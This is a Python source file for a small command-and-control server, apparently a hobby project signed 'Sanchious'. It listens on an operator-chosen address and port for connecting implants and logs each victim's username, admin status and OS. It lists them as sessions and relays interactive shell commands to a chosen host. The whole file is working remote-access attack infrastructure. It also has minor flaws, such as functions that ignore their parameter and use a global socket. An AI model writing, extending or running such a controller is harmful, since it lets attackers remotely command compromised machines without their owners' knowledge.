import socket
import sys
import threading
from prettytable import PrettyTable
import time
from datetime import datetime


def banner():
    print('███████  █████  ███    ██  ██████ ██████  ')
    print('██      ██   ██ ████   ██ ██           ██ ')
    print('███████ ███████ ██ ██  ██ ██       █████  ')
    print('     ██ ██   ██ ██  ██ ██ ██      ██      ')
    print('███████ ██   ██ ██   ████  ██████ ███████  by Sanchious')


def inbound_message(remote_target):
    print(f'[+] Awaiting response...')
    response = session_id.recv(1024).decode()
    return response


def outbound_message(remote_target, message):
    session_id.send(message.encode())


def listener_handler():
    sock.bind((host_ip, int(host_port)))
    print(
        f'[*] Started listener on {host_ip}:{host_port}...\n')
    sock.listen()
    t1 = threading.Thread(target=message_handler)
    t1.start()


def message_handler():
    while True:
        if exit_flag == True:
            break
        try:
            remote_target, remote_ip = sock.accept()
            username = remote_target.recv(1024).decode()
            print('username received - ', username)
            admin = remote_target.recv(1024).decode()
            print('admin value received - ', admin)
            platform = remote_target.recv(1024).decode()
            print('platform value received - ', platform)
            if admin == '1':
                isAdmin = 'Yes'
            elif username == 'root':
                isAdmin = 'Yes'
            else:
                isAdmin = 'No'
            current_time = time.strftime("%H:%M:%S", time.localtime())
            date = datetime.now()
            time_stamp = (
                f"{date.month}/{date.day}/{date.year} {current_time}")
            host_name = socket.gethostbyaddr(remote_ip[0])
            if host_name is not None:
                sessions.append(
                    [remote_target, f"{host_name[0]}@{remote_ip[0]}", time_stamp, username, isAdmin, platform])
                print(
                    f'\n[*] Connection received from {host_name[0]}@{remote_ip[0]} \nEnter command#> ', end='')
            else:
                sessions.append(
                    [remote_target, remote_ip[0], time_stamp, username, isAdmin, platform])
                print(
                    f'\n[*] Connection received from {remote_ip[0]} \nEnter command#> ', end='')
        except:
            pass


def session_handler(session_id):
    while True:
        message = input('send message#> ')
        if message == 'exit':
            outbound_message(session_id, message)
            session_id.close()
            break
        elif message == 'background':
            break
        elif not message:
            continue
        outbound_message(session_id, message)

        response = inbound_message(session_id)
        if response == 'exit':
            print('[-] The client has terminated the session.')
            session_id.close()
            break
        print(response)


if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    banner()
    sessions = []
    listener_counter = 0
    exit_flag = False
    while True:
        try:
            command = input('Enter command#> ')
            if command == 'start listener':
                host_ip = input('[*] Enter LHOST IP: ')
                host_port = input('[*] Enter LPORT to listen on: ')
                listener_handler()
                listener_counter += 1
            if command.split(' ')[0] == 'sessions':
                session_counter = 1
                if command.split(' ')[1] == '-l':
                    table = PrettyTable()
                    table.field_names = ['Session', 'Status', 'Username', 'Admin',
                                         'Target', 'OS Platform', 'Connection Time']
                    table.padding_width = 2
                    for target in sessions:
                        table.add_row(
                            [session_counter, 'Placeholder', target[3], target[4], target[1], target[5], target[2]])
                        session_counter += 1
                    print(table)
                if command.split(' ')[1] == '-i':
                    num = int(command.split(' ')[2])
                    session_id = (sessions[num - 1])[0]
                    session_handler(session_id)
            if command == 'exit':
                exit_flag = True
                sock.close()
                break

        except KeyboardInterrupt:
            print('\n [-] Keyboard interrupt issued.')
            exit_flag = True
            sock.close()
            break
        except Exception as e:
            print(e)
